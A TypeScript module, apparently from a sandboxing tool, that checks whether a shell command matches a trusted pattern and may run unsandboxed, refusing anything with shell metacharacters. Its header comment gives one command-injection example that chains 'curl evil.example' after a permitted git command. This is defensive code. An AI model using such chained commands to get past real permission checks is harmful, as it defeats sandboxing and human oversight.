/**
 * opencode-sandbox — trusted unsandboxed command patterns.
 *
 * A pattern is an exact command or a `prefix *` form. The matcher is
 * deliberately conservative: any shell metacharacter in the pattern or in the
 * command disqualifies the command, so `git push *` can never authorize
 * `git push origin main; curl evil.example`. This is not a shell parser; a
 * quoted `;` also asks for the normal sandbox instead of taking the shortcut.
 */

const UNSAFE = /[;&|`$()<>\n\r]/;

/** Normalize a trusted pattern. Returns undefined for an unsafe pattern. */
export function normalizeUnsandboxedPattern(value: string): string | undefined {
  const pattern = value.trim();
  if (pattern === "" || UNSAFE.test(pattern)) return undefined;
  if (pattern.includes("*") && !pattern.endsWith(" *")) return undefined;
  return pattern;
}

/**
 * Return the pattern that authorizes `command` outside the sandbox, if any.
 * Commands with metacharacters never match; use the sandbox instead.
 */
export function matchesUnsandboxed(
  command: string,
  patterns: readonly string[]
): string | undefined {
  const normalized = command.trim();
  if (normalized === "" || UNSAFE.test(normalized)) return undefined;

  for (const pattern of patterns) {
    if (pattern.endsWith(" *")) {
      const prefix = pattern.slice(0, -2);
      if (!normalized.startsWith(`${prefix} `)) continue;
      const rest = normalized.slice(prefix.length + 1);
      if (rest !== "" && !UNSAFE.test(rest)) return pattern;
      continue;
    }
    if (normalized === pattern) return pattern;
  }
  return undefined;
}
